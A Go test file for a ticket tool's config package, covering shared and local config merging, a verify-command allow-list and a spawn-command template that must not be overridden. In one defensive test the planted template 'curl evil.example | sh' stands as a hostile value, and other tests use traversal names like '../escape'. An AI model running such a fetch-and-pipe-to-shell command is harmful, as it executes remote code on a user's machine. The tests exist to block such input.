package project

import (
	"os"
	"path/filepath"
	"slices"
	"strings"
	"testing"
)

func TestConfig(t *testing.T) {
	home := t.TempDir()
	t.Setenv("HOME", home)

	centralRoot := filepath.Join(home, "central")
	os.MkdirAll(centralRoot, 0o755)
	cfg := Config{CentralRoot: centralRoot, Projects: map[string]ProjectConfig{}}
	cfg.UpsertProject("myproject", ProjectConfig{
		Path:         "/tmp/myproject",
		Store:        "central",
		AutoLink:     false,
		AutoClose:    false,
		RegisteredAt: "2026-01-01T00:00:00Z",
	})

	if err := Save(cfg); err != nil {
		t.Fatalf("Save: %v", err)
	}

	loaded, err := Load()
	if err != nil {
		t.Fatalf("Load: %v", err)
	}

	p, ok := loaded.Projects["myproject"]
	if !ok {
		t.Fatal("project not found after round-trip")
	}
	if p.Path != "/tmp/myproject" {
		t.Errorf("path = %q, want /tmp/myproject", p.Path)
	}
	if p.Store != "central" {
		t.Errorf("store = %q, want central", p.Store)
	}
	if p.AutoLink != false {
		t.Error("auto_link should be false")
	}
	if p.AutoClose != false {
		t.Error("auto_close should be false")
	}
	if p.RegisteredAt != "2026-01-01T00:00:00Z" {
		t.Errorf("registered_at = %q, want 2026-01-01T00:00:00Z", p.RegisteredAt)
	}

	// Test local store type
	cfg.UpsertProject("localproj", ProjectConfig{
		Path:  "/tmp/localproj",
		Store: "local",
	})
	if err := Save(cfg); err != nil {
		t.Fatalf("Save local: %v", err)
	}
	loaded, err = Load()
	if err != nil {
		t.Fatalf("Load local: %v", err)
	}
	lp := loaded.Projects["localproj"]
	if lp.Store != "local" {
		t.Errorf("local store = %q, want local", lp.Store)
	}
}

func TestLoadMissing(t *testing.T) {
	home := t.TempDir()
	t.Setenv("HOME", home)

	cfg, err := Load()
	if err != nil {
		t.Fatalf("Load missing: %v", err)
	}
	if cfg.Projects == nil {
		t.Fatal("Projects should not be nil")
	}
	if len(cfg.Projects) != 0 {
		t.Errorf("expected 0 projects, got %d", len(cfg.Projects))
	}
}

func TestLoadEmpty(t *testing.T) {
	home := t.TempDir()
	t.Setenv("HOME", home)

	configDir := filepath.Join(home, configDirName)
	os.MkdirAll(configDir, 0o755)
	os.WriteFile(filepath.Join(configDir, configFileName), []byte(""), 0o644)

	cfg, err := Load()
	if err != nil {
		t.Fatalf("Load empty: %v", err)
	}
	if len(cfg.Projects) != 0 {
		t.Errorf("expected 0 projects, got %d", len(cfg.Projects))
	}
}

func TestLoadMalformed(t *testing.T) {
	home := t.TempDir()
	t.Setenv("HOME", home)

	configDir := filepath.Join(home, configDirName)
	os.MkdirAll(configDir, 0o755)
	os.WriteFile(filepath.Join(configDir, configFileName), []byte(":::bad yaml{{{"), 0o644)

	_, err := Load()
	if err == nil {
		t.Fatal("expected error for malformed YAML")
	}
}

func TestLoadSharedConflictMarkers(t *testing.T) {
	home := t.TempDir()
	t.Setenv("HOME", home)

	centralRoot := filepath.Join(home, "central")
	os.MkdirAll(centralRoot, 0o755)

	// Local config is well-formed and points at the central root.
	configDir := filepath.Join(home, configDirName)
	os.MkdirAll(configDir, 0o755)
	os.WriteFile(filepath.Join(configDir, configFileName),
		[]byte("central_root: "+centralRoot+"\nprojects: {}\n"), 0o644)

	// Shared config has unresolved git merge conflict markers — exactly the
	// state the broken 7.2 sync produced.
	sharedPath := filepath.Join(centralRoot, configFileName)
	os.WriteFile(sharedPath, []byte(`projects:
    loom:
        store: central
<<<<<<< Updated upstream
        registered_at: "2026-04-25T20:38:12Z"
=======
        registered_at: "2026-04-25T20:38:35Z"
>>>>>>> Stashed changes
`), 0o644)

	_, err := Load()
	if err == nil {
		t.Fatal("expected Load to surface the shared-config parse error")
	}
	if !strings.Contains(err.Error(), sharedPath) {
		t.Errorf("error should mention shared config path; got %v", err)
	}
}

func TestConfigPath(t *testing.T) {
	home := t.TempDir()
	t.Setenv("HOME", home)

	path, err := ConfigPath()
	if err != nil {
		t.Fatalf("ConfigPath: %v", err)
	}
	expected := filepath.Join(home, ".ticket", "config.yaml")
	if path != expected {
		t.Errorf("ConfigPath = %q, want %q", path, expected)
	}
}

func TestUpsertProject(t *testing.T) {
	cfg := Config{}
	cfg.UpsertProject("test", ProjectConfig{Store: "central"})

	if cfg.Projects == nil {
		t.Fatal("Projects should not be nil after upsert")
	}
	if cfg.Projects["test"].Store != "central" {
		t.Error("upserted project not found")
	}

	// Overwrite
	cfg.UpsertProject("test", ProjectConfig{Store: "local"})
	if cfg.Projects["test"].Store != "local" {
		t.Error("upsert should overwrite")
	}
}

func TestCentralStoreRootNoFallback(t *testing.T) {
	home := t.TempDir()
	t.Setenv("HOME", home)

	// No config — should return error, not fallback
	_, err := CentralStoreRoot()
	if err == nil {
		t.Fatal("CentralStoreRoot should error when central_root not configured")
	}
}

func TestIsConfigured(t *testing.T) {
	home := t.TempDir()
	t.Setenv("HOME", home)

	// No config — not configured
	if IsConfigured() {
		t.Error("should not be configured without config file")
	}

	// With central_root — configured
	cfg := Config{CentralRoot: "/some/path", Projects: map[string]ProjectConfig{}}
	Save(cfg)
	if !IsConfigured() {
		t.Error("should be configured after setting central_root")
	}
}

func TestCentralStoreRootFromConfig(t *testing.T) {
	home := t.TempDir()
	t.Setenv("HOME", home)

	cfg := Config{CentralRoot: "/custom/central/tickets", Projects: map[string]ProjectConfig{}}
	Save(cfg)

	root, err := CentralStoreRoot()
	if err != nil {
		t.Fatalf("CentralStoreRoot: %v", err)
	}
	if root != "/custom/central/tickets" {
		t.Errorf("CentralStoreRoot = %q, want /custom/central/tickets", root)
	}
}

func TestCentralProjectDir(t *testing.T) {
	home := t.TempDir()
	t.Setenv("HOME", home)

	centralRoot := filepath.Join(home, "central")
	cfg := Config{CentralRoot: centralRoot, Projects: map[string]ProjectConfig{}}
	Save(cfg)

	dir, err := CentralProjectDir("myproject")
	if err != nil {
		t.Fatalf("CentralProjectDir: %v", err)
	}
	expected := filepath.Join(centralRoot, "tickets", "myproject")
	if dir != expected {
		t.Errorf("CentralProjectDir = %q, want %q", dir, expected)
	}
}

// filepath.Join cleans traversal segments instead of failing, so a name that is
// not a single path element has to be refused here — this is the one place the
// name is joined into the store root, and its callers pass config map keys.
func TestCentralProjectDirRejectsInvalidNames(t *testing.T) {
	home := t.TempDir()
	t.Setenv("HOME", home)

	centralRoot := filepath.Join(home, "central")
	cfg := Config{CentralRoot: centralRoot, Projects: map[string]ProjectConfig{}}
	Save(cfg)

	for _, name := range []string{"", ".", "..", "../escape", "a/b", "../../elsewhere"} {
		dir, err := CentralProjectDir(name)
		if err == nil {
			t.Errorf("CentralProjectDir(%q) = %q, want an error", name, dir)
		}
	}
}

func TestSharedConfig(t *testing.T) {
	home := t.TempDir()
	t.Setenv("HOME", home)

	centralRoot := filepath.Join(home, "central")
	os.MkdirAll(centralRoot, 0o755)

	cfg := Config{
		CentralRoot: centralRoot,
		Projects: map[string]ProjectConfig{
			"proj": {
				Path:         "/local/proj",
				Store:        "central",
				AutoLink:     true,
				RegisteredAt: "2026-01-01T00:00:00Z",
			},
		},
	}
	Save(cfg)

	// Read shared config directly
	shared, err := loadFile(filepath.Join(centralRoot, configFileName))
	if err != nil {
		t.Fatalf("loadFile shared: %v", err)
	}
	sp := shared.Projects["proj"]
	if sp.Store != "central" {
		t.Errorf("shared store = %q, want central", sp.Store)
	}
	if !sp.AutoLink {
		t.Error("shared auto_link should be true")
	}
	if sp.RegisteredAt != "2026-01-01T00:00:00Z" {
		t.Errorf("shared registered_at = %q", sp.RegisteredAt)
	}
}

func TestLocalConfig(t *testing.T) {
	home := t.TempDir()
	t.Setenv("HOME", home)

	centralRoot := filepath.Join(home, "central")
	os.MkdirAll(centralRoot, 0o755)

	cfg := Config{
		CentralRoot: centralRoot,
		Projects: map[string]ProjectConfig{
			"proj": {
				Path:  "/local/proj",
				Store: "central",
			},
		},
	}
	Save(cfg)

	// Read local config directly
	local, err := loadLocalOnly()
	if err != nil {
		t.Fatalf("loadLocalOnly: %v", err)
	}
	lp := local.Projects["proj"]
	if lp.Path != "/local/proj" {
		t.Errorf("local path = %q, want /local/proj", lp.Path)
	}

	// Read shared config — should NOT have path
	shared, _ := loadFile(filepath.Join(centralRoot, configFileName))
	sp := shared.Projects["proj"]
	if sp.Path != "" {
		t.Errorf("shared config should not have path, got %q", sp.Path)
	}
}

func TestLoadMerge(t *testing.T) {
	home := t.TempDir()
	t.Setenv("HOME", home)

	centralRoot := filepath.Join(home, "central")
	os.MkdirAll(centralRoot, 0o755)

	// Write shared config with project store info
	sharedCfg := Config{Projects: map[string]ProjectConfig{
		"proj": {Store: "central", AutoLink: true, RegisteredAt: "2026-01-01T00:00:00Z"},
	}}
	writeFileAtomic(filepath.Join(centralRoot, configFileName), sharedCfg)

	// Write local config with path and central_root
	localCfg := Config{
		CentralRoot: centralRoot,
		GitEmail:    "me@example.com",
		Projects: map[string]ProjectConfig{
			"proj": {Path: "/my/local/path"},
		},
	}
	localPath, _ := ConfigPath()
	writeFileAtomic(localPath, localCfg)

	// Load should merge
	merged, err := Load()
	if err != nil {
		t.Fatalf("Load: %v", err)
	}

	p := merged.Projects["proj"]
	if p.Path != "/my/local/path" {
		t.Errorf("path = %q, want /my/local/path", p.Path)
	}
	if p.Store != "central" {
		t.Errorf("store = %q, want central", p.Store)
	}
	if !p.AutoLink {
		t.Error("auto_link should be true from shared")
	}
	if merged.GitEmail != "me@example.com" {
		t.Errorf("git_email = %q, want me@example.com", merged.GitEmail)
	}
}

func TestLoadSharedOnly(t *testing.T) {
	home := t.TempDir()
	t.Setenv("HOME", home)

	centralRoot := filepath.Join(home, "central")
	os.MkdirAll(centralRoot, 0o755)

	// Write shared config with project info
	sharedCfg := Config{Projects: map[string]ProjectConfig{
		"proj": {Store: "central", RegisteredAt: "2026-01-01T00:00:00Z"},
	}}
	writeFileAtomic(filepath.Join(centralRoot, configFileName), sharedCfg)

	// Local config has central_root but no project entries
	localCfg := Config{CentralRoot: centralRoot, Projects: map[string]ProjectConfig{}}
	localPath, _ := ConfigPath()
	writeFileAtomic(localPath, localCfg)

	merged, err := Load()
	if err != nil {
		t.Fatalf("Load: %v", err)
	}

	p := merged.Projects["proj"]
	if p.Store != "central" {
		t.Errorf("store = %q, want central", p.Store)
	}
	if p.Path != "" {
		t.Errorf("path should be empty, got %q", p.Path)
	}
}

func TestLoadLocalOnly(t *testing.T) {
	home := t.TempDir()
	t.Setenv("HOME", home)

	// No shared config — central root doesn't exist
	cfg := Config{
		Projects: map[string]ProjectConfig{
			"proj": {Path: "/local/proj", Store: "local"},
		},
	}
	localPath, _ := ConfigPath()
	writeFileAtomic(localPath, cfg)

	merged, err := Load()
	if err != nil {
		t.Fatalf("Load: %v", err)
	}

	p := merged.Projects["proj"]
	if p.Path != "/local/proj" {
		t.Errorf("path = %q, want /local/proj", p.Path)
	}
	if p.Store != "local" {
		t.Errorf("store = %q, want local", p.Store)
	}
}

func TestSharedConfigExclusions(t *testing.T) {
	home := t.TempDir()
	t.Setenv("HOME", home)

	centralRoot := filepath.Join(home, "central")
	os.MkdirAll(centralRoot, 0o755)

	cfg := Config{
		CentralRoot:  centralRoot,
		GitEmail:     "me@example.com",
		GitName:      "Me",
		DefaultStore: "central",
		SyncInterval: "10s",
		Projects: map[string]ProjectConfig{
			"proj": {
				Path:         "/local/proj",
				Store:        "central",
				RegisteredAt: "2026-01-01T00:00:00Z",
			},
		},
	}
	Save(cfg)

	// Read shared config directly
	shared, err := loadFile(filepath.Join(centralRoot, configFileName))
	if err != nil {
		t.Fatalf("loadFile shared: %v", err)
	}

	// Top-level local-only fields should NOT be in shared
	if shared.CentralRoot != "" {
		t.Errorf("shared has central_root: %q", shared.CentralRoot)
	}
	if shared.GitEmail != "" {
		t.Errorf("shared has git_email: %q", shared.GitEmail)
	}
	if shared.GitName != "" {
		t.Errorf("shared has git_name: %q", shared.GitName)
	}
	if shared.DefaultStore != "" {
		t.Errorf("shared has default_store: %q", shared.DefaultStore)
	}
	if shared.SyncInterval != "" {
		t.Errorf("shared has sync_interval: %q", shared.SyncInterval)
	}

	// Path should NOT be in shared projects
	sp := shared.Projects["proj"]
	if sp.Path != "" {
		t.Errorf("shared project has path: %q", sp.Path)
	}
}

func TestVerifyAllowDefaultsWhenUnset(t *testing.T) {
	t.Setenv("HOME", t.TempDir())

	got, err := VerifyAllow()
	if err != nil {
		t.Fatalf("VerifyAllow: %v", err)
	}
	// Spelled out rather than compared to defaultVerifyAllow: widening what a
	// ticket may run by default has to be a deliberate edit in two places.
	want := []string{"go", "make", "cargo", "pytest"}
	if !slices.Equal(got, want) {
		t.Fatalf("VerifyAllow() = %q, want the built-in default %q", got, want)
	}

	// The default slice itself must not escape: a caller appending within
	// capacity or writing an element would edit it for the whole process.
	got[0] = "sh"
	if defaultVerifyAllow[0] != "go" {
		t.Errorf("defaultVerifyAllow = %q, want it unchanged by a caller writing to the returned slice", defaultVerifyAllow)
	}
}

func TestVerifyAllowFailsClosedOnUnreadableConfig(t *testing.T) {
	home := t.TempDir()
	t.Setenv("HOME", home)

	localPath, _ := ConfigPath()
	os.MkdirAll(filepath.Dir(localPath), 0o755)
	// A half-synced or conflicted local config must not silently restore the
	// defaults over a list the user had narrowed.
	if err := os.WriteFile(localPath, []byte("<<<<<<< HEAD\nverify_allow:\n  - make\n"), 0o644); err != nil {
		t.Fatal(err)
	}

	got, err := VerifyAllow()
	if err == nil {
		t.Error("VerifyAllow() returned no error for an unparseable local config")
	}
	if len(got) != 0 {
		t.Errorf("VerifyAllow() = %q, want an empty list when the local config cannot be read", got)
	}
}

func TestVerifyAllowExplicitEmptyRefusesEverything(t *testing.T) {
	home := t.TempDir()
	t.Setenv("HOME", home)

	localPath, _ := ConfigPath()
	os.MkdirAll(filepath.Dir(localPath), 0o755)
	if err := os.WriteFile(localPath, []byte("verify_allow: []\n"), 0o644); err != nil {
		t.Fatal(err)
	}

	got, err := VerifyAllow()
	if err != nil {
		t.Fatalf("VerifyAllow: %v", err)
	}
	if len(got) != 0 {
		t.Errorf("VerifyAllow() = %q, want an empty list: an explicit empty verify_allow refuses everything", got)
	}

	// A save round-trip (project registration, for one) must not drop the key
	// and hand the defaults back.
	cfg, err := Load()
	if err != nil {
		t.Fatalf("Load: %v", err)
	}
	if err := Save(cfg); err != nil {
		t.Fatalf("Save: %v", err)
	}
	got, err = VerifyAllow()
	if err != nil {
		t.Fatalf("VerifyAllow: %v", err)
	}
	if len(got) != 0 {
		t.Errorf("VerifyAllow() = %q after a round-trip, want the explicit empty list preserved", got)
	}
}

// TestVerifyAllowBareKeyRefusesEverything covers the spelling yaml resolves to
// null. `verify_allow:` with no value is a written key, so it means refuse
// everything exactly as `verify_allow: []` does — reading it as unset would
// hand the defaults back to someone who had just locked the machine down.
func TestVerifyAllowBareKeyRefusesEverything(t *testing.T) {
	for _, spelling := range []string{"verify_allow:\n", "verify_allow: ~\n", "verify_allow: null\n"} {
		t.Run(spelling, func(t *testing.T) {
			home := t.TempDir()
			t.Setenv("HOME", home)

			localPath, _ := ConfigPath()
			os.MkdirAll(filepath.Dir(localPath), 0o755)
			if err := os.WriteFile(localPath, []byte(spelling), 0o644); err != nil {
				t.Fatal(err)
			}

			got, err := VerifyAllow()
			if err != nil {
				t.Fatalf("VerifyAllow: %v", err)
			}
			if len(got) != 0 {
				t.Errorf("VerifyAllow() = %q, want an empty list: a valueless verify_allow refuses everything", got)
			}

			// The meaning must survive a save round-trip (project registration,
			// for one). Normalizing the key to `[]` on disk is fine; restoring
			// the defaults is not.
			cfg, err := Load()
			if err != nil {
				t.Fatalf("Load: %v", err)
			}
			if err := Save(cfg); err != nil {
				t.Fatalf("Save: %v", err)
			}
			got, err = VerifyAllow()
			if err != nil {
				t.Fatalf("VerifyAllow: %v", err)
			}
			if len(got) != 0 {
				t.Errorf("VerifyAllow() = %q after a round-trip, want the refusal preserved", got)
			}
		})
	}
}

// TestVerifyAllowAbsentKeySurvivesSave holds the other half of the three-state
// design: an unconfigured machine must round-trip to an absent key, not to the
// empty list that refuses everything.
func TestVerifyAllowAbsentKeySurvivesSave(t *testing.T) {
	home := t.TempDir()
	t.Setenv("HOME", home)

	centralRoot := filepath.Join(home, "central")
	os.MkdirAll(centralRoot, 0o755)

	if err := Save(Config{CentralRoot: centralRoot}); err != nil {
		t.Fatalf("Save: %v", err)
	}
	cfg, err := Load()
	if err != nil {
		t.Fatalf("Load: %v", err)
	}
	if cfg.VerifyAllow != nil {
		t.Fatalf("merged verify_allow = %q, want it absent", cfg.VerifyAllow)
	}
	if err := Save(cfg); err != nil {
		t.Fatalf("Save: %v", err)
	}

	localPath, _ := ConfigPath()
	raw, err := os.ReadFile(localPath)
	if err != nil {
		t.Fatal(err)
	}
	if strings.Contains(string(raw), "verify_allow") {
		t.Errorf("local config gained a verify_allow key:\n%s", raw)
	}

	got, err := VerifyAllow()
	if err != nil {
		t.Fatalf("VerifyAllow: %v", err)
	}
	if !slices.Equal(got, []string{"go", "make", "cargo", "pytest"}) {
		t.Errorf("VerifyAllow() = %q after a round-trip, want the built-in default", got)
	}
}

func TestVerifyAllowReadsLocalOnly(t *testing.T) {
	home := t.TempDir()
	t.Setenv("HOME", home)

	centralRoot := filepath.Join(home, "central")
	os.MkdirAll(centralRoot, 0o755)

	localPath, _ := ConfigPath()
	writeFileAtomic(localPath, Config{CentralRoot: centralRoot, VerifyAllow: []string{"go"}})
	// An entry planted in the synced shared config must not widen the list —
	// the same push that carries a hostile verify command could write it.
	writeFileAtomic(filepath.Join(centralRoot, configFileName), Config{VerifyAllow: []string{"rm"}})

	got, _ := VerifyAllow()
	if len(got) != 1 || got[0] != "go" {
		t.Errorf("VerifyAllow() = %q, want only the machine-local [go]", got)
	}
}

// TestVerifyAllowIgnoresStoreRootOverride pins the allow-list to the machine
// owner's own config. TK_STORE_ROOT moves every store and config path except
// this one: the override root belongs to whoever set the variable, so following
// it would let a sandbox widen the list, and a sandbox with no config would
// restore the defaults over a list the owner had narrowed.
func TestVerifyAllowIgnoresStoreRootOverride(t *testing.T) {
	home := t.TempDir()
	t.Setenv("HOME", home)

	homePath, err := homeConfigPath()
	if err != nil {
		t.Fatal(err)
	}
	os.MkdirAll(filepath.Dir(homePath), 0o755)
	writeFileAtomic(homePath, Config{VerifyAllow: []string{"go"}})

	override := t.TempDir()
	t.Setenv(StoreRootEnv, override)

	// No config in the sandbox: the narrowed list still governs rather than
	// falling through to the built-in defaults.
	got, err := VerifyAllow()
	if err != nil {
		t.Fatalf("VerifyAllow: %v", err)
	}
	if !slices.Equal(got, []string{"go"}) {
		t.Errorf("VerifyAllow() = %q under an empty override root, want the machine-local [go]", got)
	}

	// A list planted in the sandbox must not widen it.
	overridePath, err := ConfigPath()
	if err != nil {
		t.Fatal(err)
	}
	os.MkdirAll(filepath.Dir(overridePath), 0o755)
	writeFileAtomic(overridePath, Config{VerifyAllow: []string{"sh"}})

	got, err = VerifyAllow()
	if err != nil {
		t.Fatalf("VerifyAllow: %v", err)
	}
	if !slices.Equal(got, []string{"go"}) {
		t.Errorf("VerifyAllow() = %q, want the machine-local [go]: the override root cannot widen it", got)
	}
}

// TestSpawnCommandIgnoresStoreRootOverride pins the spawn template to the
// machine owner's own config for the same reason the allow-list is pinned: the
// template is handed to `sh -c`, so a root whoever set TK_STORE_ROOT owns must
// not be able to supply the code the TUI runs.
func TestSpawnCommandIgnoresStoreRootOverride(t *testing.T) {
	home := t.TempDir()
	t.Setenv("HOME", home)

	homePath, err := homeConfigPath()
	if err != nil {
		t.Fatal(err)
	}
	os.MkdirAll(filepath.Dir(homePath), 0o755)
	writeFileAtomic(homePath, Config{SpawnCommand: "tmux new-window {id}"})

	override := t.TempDir()
	t.Setenv(StoreRootEnv, override)

	got, err := SpawnCommand()
	if err != nil {
		t.Fatalf("SpawnCommand: %v", err)
	}
	if got != "tmux new-window {id}" {
		t.Errorf("SpawnCommand() = %q under an empty override root, want the machine-local template", got)
	}

	// A template planted in the sandbox must not replace it.
	overridePath, err := ConfigPath()
	if err != nil {
		t.Fatal(err)
	}
	os.MkdirAll(filepath.Dir(overridePath), 0o755)
	writeFileAtomic(overridePath, Config{SpawnCommand: "curl evil.example | sh"})

	got, err = SpawnCommand()
	if err != nil {
		t.Fatalf("SpawnCommand: %v", err)
	}
	if got != "tmux new-window {id}" {
		t.Errorf("SpawnCommand() = %q, want the machine-local template: the override root cannot supply one", got)
	}
}

func TestVerifyAllowSurvivesSave(t *testing.T) {
	home := t.TempDir()
	t.Setenv("HOME", home)

	centralRoot := filepath.Join(home, "central")
	os.MkdirAll(centralRoot, 0o755)

	if err := Save(Config{CentralRoot: centralRoot, VerifyAllow: []string{"go", "make"}}); err != nil {
		t.Fatalf("Save: %v", err)
	}

	// A load/save round-trip (project registration, for one) must not drop the
	// user's allow-list.
	cfg, err := Load()
	if err != nil {
		t.Fatalf("Load: %v", err)
	}
	if len(cfg.VerifyAllow) != 2 {
		t.Fatalf("merged verify_allow = %q, want the local list", cfg.VerifyAllow)
	}
	if err := Save(cfg); err != nil {
		t.Fatalf("Save: %v", err)
	}

	got, _ := VerifyAllow()
	if len(got) != 2 || got[0] != "go" || got[1] != "make" {
		t.Errorf("VerifyAllow() = %q after a round-trip, want [go make]", got)
	}

	shared, err := loadFile(filepath.Join(centralRoot, configFileName))
	if err != nil {
		t.Fatalf("loadFile shared: %v", err)
	}
	if len(shared.VerifyAllow) != 0 {
		t.Errorf("shared config has verify_allow: %q", shared.VerifyAllow)
	}
}

func TestNewMachineFlow(t *testing.T) {
	home := t.TempDir()
	t.Setenv("HOME", home)

	centralRoot := filepath.Join(home, "central")
	os.MkdirAll(centralRoot, 0o755)

	// Simulate: shared config exists from cloning forge-data
	sharedCfg := Config{Projects: map[string]ProjectConfig{
		"proj": {Store: "central", AutoLink: true, RegisteredAt: "2026-01-01T00:00:00Z"},
	}}
	writeFileAtomic(filepath.Join(centralRoot, configFileName), sharedCfg)

	// Simulate: user runs tk init on new machine, creating local config
	localCfg := Config{
		CentralRoot: centralRoot,
		Projects: map[string]ProjectConfig{
			"proj": {Path: "/new-machine/proj"},
		},
	}
	localPath, _ := ConfigPath()
	writeFileAtomic(localPath, localCfg)

	// Load should merge shared + local
	merged, err := Load()
	if err != nil {
		t.Fatalf("Load: %v", err)
	}

	p := merged.Projects["proj"]
	if p.Path != "/new-machine/proj" {
		t.Errorf("path = %q, want /new-machine/proj", p.Path)
	}
	if p.Store != "central" {
		t.Errorf("store = %q, want central (from shared)", p.Store)
	}
	if !p.AutoLink {
		t.Error("auto_link should be true (from shared)")
	}

	// Save should preserve the split
	Save(merged)

	// Verify shared still has store info
	shared, _ := loadFile(filepath.Join(centralRoot, configFileName))
	if shared.Projects["proj"].Store != "central" {
		t.Error("shared store lost after save")
	}

	// Verify local still has path
	local, _ := loadLocalOnly()
	if local.Projects["proj"].Path != "/new-machine/proj" {
		t.Error("local path lost after save")
	}
}

// auto_retrospect is a shared-config field like the two flags beside it — it
// decides what a watcher on any machine reading the store does — and it is
// omitempty, so a project that never opted in keeps the key out of the file
// rather than carrying `auto_retrospect: false` after the next save.
func TestAutoRetrospectIsShared(t *testing.T) {
	home := t.TempDir()
	t.Setenv("HOME", home)

	centralRoot := filepath.Join(home, "central")
	os.MkdirAll(centralRoot, 0o755)

	cfg := Config{
		CentralRoot: centralRoot,
		Projects: map[string]ProjectConfig{
			"mined": {Path: "/local/mined", Store: "central", AutoLink: true, AutoClose: true, AutoRetrospect: true},
			"plain": {Path: "/local/plain", Store: "central", AutoLink: true, AutoClose: true},
		},
	}
	if err := Save(cfg); err != nil {
		t.Fatalf("Save: %v", err)
	}

	shared, err := os.ReadFile(filepath.Join(centralRoot, configFileName))
	if err != nil {
		t.Fatalf("read shared config: %v", err)
	}
	if !strings.Contains(string(shared), "auto_retrospect: true") {
		t.Errorf("shared config does not carry the flag:\n%s", string(shared))
	}
	if strings.Count(string(shared), "auto_retrospect") != 1 {
		t.Errorf("an opted-out project carries the key:\n%s", string(shared))
	}

	local, err := loadLocalOnly()
	if err != nil {
		t.Fatalf("loadLocalOnly: %v", err)
	}
	if local.Projects["mined"].AutoRetrospect {
		t.Error("the flag was written to the local config")
	}

	loaded, err := Load()
	if err != nil {
		t.Fatalf("Load: %v", err)
	}
	if !loaded.Projects["mined"].AutoRetrospect {
		t.Error("mined auto_retrospect lost in the round-trip")
	}
	if loaded.Projects["plain"].AutoRetrospect {
		t.Error("plain auto_retrospect should read false when the key is absent")
	}
}

// TestMigrateJournalDefaults covers the one-time flip of the auto_link and
// auto_close pair `tk init` hardcoded to false: both-false is that un-chosen
// default and becomes true, a mixed pair is a deliberate choice and is left
// alone, and the marker keeps a later disable disabled.
func TestMigrateJournalDefaults(t *testing.T) {
	cfg := Config{Projects: map[string]ProjectConfig{
		"inert":     {Store: "central"},
		"link-only": {Store: "central", AutoLink: true},
		"both":      {Store: "central", AutoLink: true, AutoClose: true},
	}}

	flipped, changed := MigrateJournalDefaults(&cfg)
	if !changed {
		t.Fatal("changed = false, want true — the marker alone has to be saved")
	}
	if !slices.Equal(flipped, []string{"inert"}) {
		t.Errorf("flipped = %q, want [inert]", flipped)
	}
	if p := cfg.Projects["inert"]; !p.AutoLink || !p.AutoClose {
		t.Errorf("inert = %+v, want both flags on", p)
	}
	if p := cfg.Projects["link-only"]; !p.AutoLink || p.AutoClose {
		t.Errorf("link-only = %+v, want the deliberate mixed pair untouched", p)
	}
	if !cfg.JournalDefaultsMigrated {
		t.Error("journal_defaults_migrated not set")
	}

	// A user who disables journaling after the migration stays disabled.
	cfg.Projects["inert"] = ProjectConfig{Store: "central"}
	flipped, changed = MigrateJournalDefaults(&cfg)
	if changed || len(flipped) != 0 {
		t.Errorf("second run: flipped = %q, changed = %t, want no change once the marker is set", flipped, changed)
	}
	if p := cfg.Projects["inert"]; p.AutoLink || p.AutoClose {
		t.Errorf("inert = %+v, want the later disable respected", p)
	}
}

// The marker belongs to the store, not the machine: it rides in the shared
// config next to the flags it decided, so a second machine reading the same
// store does not run the flip again over a disable made on the first.
func TestMigrateJournalDefaultsMarkerIsShared(t *testing.T) {
	home := t.TempDir()
	t.Setenv("HOME", home)

	centralRoot := filepath.Join(home, "central")
	os.MkdirAll(centralRoot, 0o755)

	cfg := Config{
		CentralRoot: centralRoot,
		Projects: map[string]ProjectConfig{
			"proj": {Path: "/local/proj", Store: "central"},
		},
	}
	if _, changed := MigrateJournalDefaults(&cfg); !changed {
		t.Fatal("MigrateJournalDefaults reported no change")
	}
	if err := Save(cfg); err != nil {
		t.Fatalf("Save: %v", err)
	}

	shared, err := loadFile(filepath.Join(centralRoot, configFileName))
	if err != nil {
		t.Fatalf("loadFile shared: %v", err)
	}
	if !shared.JournalDefaultsMigrated {
		t.Error("shared config has no journal_defaults_migrated marker")
	}
	local, err := loadLocalOnly()
	if err != nil {
		t.Fatalf("loadLocalOnly: %v", err)
	}
	if local.JournalDefaultsMigrated {
		t.Error("local config carries the marker; it belongs to the store")
	}

	loaded, err := Load()
	if err != nil {
		t.Fatalf("Load: %v", err)
	}
	if !loaded.JournalDefaultsMigrated {
		t.Fatal("merged config lost the marker, so the migration would run again")
	}
	if p := loaded.Projects["proj"]; !p.AutoLink || !p.AutoClose {
		t.Errorf("proj = %+v, want the flipped flags persisted", p)
	}
}

func TestResolveWorkDir(t *testing.T) {
	cfg := Config{
		Projects: map[string]ProjectConfig{
			"ticket": {Path: "/Users/steve/code/ticket"},
			"nopath": {Path: ""},
		},
	}

	// Central store: <root>/tickets/<project> → the project's configured path.
	if got := ResolveWorkDir("/Users/steve/code/tickets-store/tickets/ticket", cfg); got != "/Users/steve/code/ticket" {
		t.Errorf("central store: got %q, want /Users/steve/code/ticket", got)
	}

	// Both no-path cases resolve to nothing rather than to the parent of the
	// tickets dir: a tickets dir is always <root>/tickets/<project>, so that
	// parent is the central tickets dir and never a repo — and it is the
	// directory `tk ui` would spawn a work session in.
	for _, dir := range []string{
		"/central/tickets/unknown", // no config entry at all
		"/central/tickets/nopath",  // entry present, path empty
	} {
		if got := ResolveWorkDir(dir, cfg); got != "" {
			t.Errorf("ResolveWorkDir(%q) = %q, want the empty string", dir, got)
		}
	}
}

func TestStoreRootOverrideWinsOverConfig(t *testing.T) {
	home := t.TempDir()
	t.Setenv("HOME", home)

	configured := t.TempDir()
	cfg := Config{CentralRoot: configured, Projects: map[string]ProjectConfig{}}
	if err := Save(cfg); err != nil {
		t.Fatalf("Save: %v", err)
	}

	override := t.TempDir()
	t.Setenv(StoreRootEnv, override)

	root, err := CentralStoreRoot()
	if err != nil {
		t.Fatalf("CentralStoreRoot: %v", err)
	}
	if root != override {
		t.Errorf("CentralStoreRoot = %q, want the override %q", root, override)
	}

	// The local config moves under the override root, so an isolated run never
	// reads or writes the machine's ~/.ticket/config.yaml.
	path, err := ConfigPath()
	if err != nil {
		t.Fatalf("ConfigPath: %v", err)
	}
	if want := filepath.Join(override, ".ticket", "config.yaml"); path != want {
		t.Errorf("ConfigPath = %q, want %q", path, want)
	}

	shared, err := SharedConfigPath()
	if err != nil {
		t.Fatalf("SharedConfigPath: %v", err)
	}
	if want := filepath.Join(override, configFileName); shared != want {
		t.Errorf("SharedConfigPath = %q, want %q", shared, want)
	}

	loaded, err := Load()
	if err != nil {
		t.Fatalf("Load: %v", err)
	}
	if loaded.CentralRoot != "" {
		t.Errorf("Load read the configured local config: central_root = %q", loaded.CentralRoot)
	}
}

// TestStoreRootOverrideSaveSplitsLocalAndShared holds Save's two halves to one
// resolution of the central root. Under the override with no central_root in
// the config — the shape an isolated run has — a local-only split predicate
// would write the shared-owned fields into both files, and a project later
// dropped from the shared config would go on merging as `store: central` from
// the stale local copy that CentralRegistered gates writes on.
